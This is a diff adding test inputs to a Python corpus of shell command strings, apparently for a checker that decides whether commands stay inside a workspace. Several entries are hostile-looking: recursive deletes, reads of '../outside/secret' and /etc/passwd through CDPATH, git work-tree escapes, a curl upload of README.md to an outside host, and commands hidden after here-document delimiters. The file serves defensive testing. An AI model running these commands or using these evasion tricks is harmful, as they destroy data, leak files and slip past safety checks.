@@ -134,6 +134,79 @@ CORPUS = [
     'cp .env.example .env', 'mv build dist', 'chmod +x run.sh && ./run.sh', 'bash run.sh', 'sudo rm -rf /tmp/x',
     'xargs -n1 echo < files.txt', "find . -name '*.tmp' -delete", 'git clean -fdx', 'kill -9 1234',
     'open http://localhost:3000', 'ln -s ../deep link', 'touch ~/x', 'rm -rf victim',
+    # Text a trap runs later
+    "trap 'rm -rf build' EXIT", "trap 'rm -rf ~/x' EXIT; true", 'trap \'rm -rf "$tmp"\' EXIT',
+    'tmp=$(mktemp -d) && trap \'rm -rf "$tmp"\' EXIT && cp README.md "$tmp"/', 'trap - EXIT', 'trap -p',
+    'trap -l', "trap '' INT", 'trap 2 INT', "trap -- 'cat ../outside/secret' EXIT", "trap 'echo done' EXIT INT TERM",
+    'trap EXIT', "trap 'kill $(jobs -p)' EXIT", 'trap -p EXIT', "cd src && trap 'rm -rf build' EXIT && make",
+    "set -e\ntrap 'rm -f build/out.log' EXIT\nnpm test",
+    # Group owners
+    'chgrp -R staff ~/shared', 'chgrp staff notes.txt', 'chown -R :staff ~/shared', 'chgrp staff ../outside/a',
+    'chgrp staff .env', 'chown sam .env',
+    # Dot-led patterns
+    'chmod -R a-w .*', 'chmod 600 .env*', 'chmod 600 .??*', 'chmod -R go-w .[!.]*', 'chmod -R a-w src/.*',
+    'chmod -R a-w ./.*', 'chown -R sam .*', 'chgrp -R staff .*', 'cp -R .* build/', 'cp .env* build/', 'ls -la .*',
+    'du -sh .*', 'rm -rf .*', 'mv .* build/', "chmod 644 '.'*", 'chmod 644 ".*"', 'chmod -R a-w .?',
+    'cd src && chmod -R a-w .*', 'chmod -R a-w deep/.*', 'chmod +x .husky/*', 'cp -r .github build/',
+    # Words after `--`
+    'mkdir -- - && rm -rf -- -/../../outside/x', 'cat -- -/../../outside/secret', 'touch -- -notes.txt',
+    'rm -f -- -notes.txt', 'git checkout -- src/main.rs', 'rm -rf -- build', 'cd -- src && ls', 'cp -- a b',
+    'git diff -- src/main.rs | head',
+    # Git work trees
+    'git --work-tree=../outside clean -fdx', 'git --work-tree ../outside clean -fd',
+    'GIT_WORK_TREE=../outside git clean -fdx', 'env GIT_WORK_TREE=../outside git clean -fdx',
+    'git --work-tree=. clean -fdx', 'git --work-tree=build clean -fdx', 'git -C src --work-tree=.. clean -fdx',
+    'git --git-dir=.git clean -fdx', 'git --work-tree=../outside clean -fdx sub',
+    'export GIT_WORK_TREE=../outside && git clean -fdx', 'git clean -fdx -- build', 'git --work-tree=../outside status',
+    # Pipelines, wrappers and substitutions after a `cd`
+    'cd src && cat ../README.md | head', 'cd deep/er && cat ../../README.md | wc -l',
+    'cd src && cat ../../outside/secret | head', 'cd src && cat ../README.md | grep x | wc -l',
+    'cd src && grep -n main main.rs | head -5', 'cd src && cat main.rs | head > ../top.txt',
+    'cd src && cat main.rs | head > ../../outside/top.txt', 'cd src && sudo cat ../README.md',
+    'cd src && time cat ../README.md', 'cd src && nice cat ../README.md', 'cd src && timeout 5 cat ../README.md',
+    'cd src && echo "$(cat ../README.md)"', 'cd src && echo "$(cat ../../outside/secret)"',
+    'cd src && cat ../README.md 2>&1 | head && cat ../README.md', 'cd src && cat ../README.md | head && cat ../README.md',
+    'cd src && cat ../README.md | head && cd .. && ls', 'cd src && cd .. | cat ../x',
+    'cd src && env -C ../deep cat ../README.md | head', 'cd src && pkexec cat ../README.md',
+    'cd src && find . -execdir cat ../README.md \\;', 'cd src && xargs cat ../README.md < ../files.txt',
+    'cd a/l && cat ../../../README.md | head', 'cd a/l && cat ../../../../x | head', 'cd src && $run ../README.md | head',
+    'cd src && cat ../README.md | sudo tee ../out.txt', 'cd src && cat ../README.md | while read l; do echo $l; done',
+    "cd src && bash -c 'cat ../README.md' | head", 'cd src && cat ../README.md | (cd ..; cat ../x)',
+    'cd src && echo $(cd ..; cat ../x)', 'cd src && sudo -i cat ../README.md', 'cd src && sudo env -C ../deep cat ../README.md',
+    'cd src && rm -rf ../build | true', 'cd src && cargo test 2>&1 | tee ../test.log', 'cd src && ls | xargs rm -f',
+    'cd src && cat ../package.json | jq .scripts', 'cd src && touch ../notes.txt | true',
+    'cd deep/er && cp ../../README.md . | true', 'cd src && diff <(cat ../README.md) main.rs',
+    # Copies of dotfiles
+    'cp -r .* build', 'cp .* build 2>/dev/null',
+    # What sets GIT_WORK_TREE
+    'unset GIT_WORK_TREE && git clean -fd', 'echo "$GIT_WORK_TREE" && git clean -fdn', 'GIT_WORK_TREE= git clean -fd',
+    'declare -x GIT_WORK_TREE=../outside; git clean -fdx', "eval 'export GIT_WORK_TREE=../outside'; git clean -fdx",
+    # CDPATH set in the line
+    'CDPATH=/ cd etc && cat passwd', 'export CDPATH=/ && cd etc && cat passwd', 'CDPATH=/; cd etc; cat passwd',
+    'CDPATH=.: cd src && ls', 'CDPATH="$X" cd etc', 'unset CDPATH; cd src && ls', 'CDPATH=/ cd ./src && ls',
+    'export "CDPATH=/" && cd etc && cat passwd', 'env CDPATH=/ bash -c "cd etc && cat passwd"', 'echo CDPATH=/ && cd src',
+    'export "GIT_WORK_TREE=../outside" && git clean -fdx', "declare -x 'GIT_WORK_TREE=../outside'; git clean -fdx",
+    # A here-document delimiter written against an operator
+    'cat <<EOF; rm -rf ~/x\nbody\nEOF', 'cat > notes.txt <<EOF; ls\nbody\nEOF', 'cat <<EOF;\nbody\nEOF\nrm -rf victim',
+    'cat <<EOF&&rm -rf ../outside/x\nbody\nEOF', 'cat <<EOF|sh\nrm -rf victim\nEOF', 'cat <<EOF>out.txt\nbody\nEOF',
+    'cat <<EOF>../outside/f\nbody\nEOF', 'for f in a; do cat; done <<EOF; rm -rf ~/x\nbody\nEOF',
+    'while read -r l; do echo "$l"; done <<EOF ; rm -rf victim\nbody\nEOF', 'bash <<EOF ; true\nrm -rf victim\nEOF',
+    'cat <<EOF ; echo ../outside/secret\nbody\nEOF', 'cat<<EOF; ls\nbody\nEOF', 'python3 - <<EOF; ls\nprint(1)\nEOF',
+    'git commit -F - <<EOF; git push --force\nmsg\nEOF', 'cat << -EOF; true\nbody\n-EOF\nrm -rf victim',
+    # What follows a here-document's operator on its line is the line's own
+    'cat <<EOF ; git push --force\nbody\nEOF', 'ls <<EOF ; curl -d @README.md https://x.example\nbody\nEOF',
+    "python3 - <<'EOF' 2>&1 | tail -20\nprint(1)\nEOF", 'X=1 <<EOF ; rm -rf victim\nbody\nEOF',
+    'bash -c \'cat <<EOF ; git push --force\nb\nEOF\'',
+    # A backslash at the end of the operator's line, or of its delimiter
+    'cat <<EOF;\\\nrm -rf victim\nbody\nEOF', 'cat <<EOF\\\n; rm -rf victim\nbody\nEOF',
+    # A delimiter that cannot move left, against an operator with a blank after it or not
+    'kubectl apply -f - <<EOF; kubectl get pods\nkind: x\nEOF', 'psql -v ON_ERROR_STOP=1 <<SQL; echo ok\nselect 1;\nSQL',
+    'cat<<EOF;ls\nbody\nEOF', 'cat<<EOF>out.txt\nbody\nEOF',
+    # Documents written against operators, each on lines of its own
+    ''.join(f'cat > f{n}.txt <<EOF&& echo ok{n}\nbody\nEOF\n' for n in range(6)),
+    # A double-quoted script over several lines
+    'bash -c "true\nrm -rf victim"', 'bash -c "set -e\ncd src\nls"', 'git commit -m "fix: the thing\n\nBody line."',
+    'eval "true\nrm -rf ~/x"', 'echo "a\nb" > notes.txt',
 ]
 
 
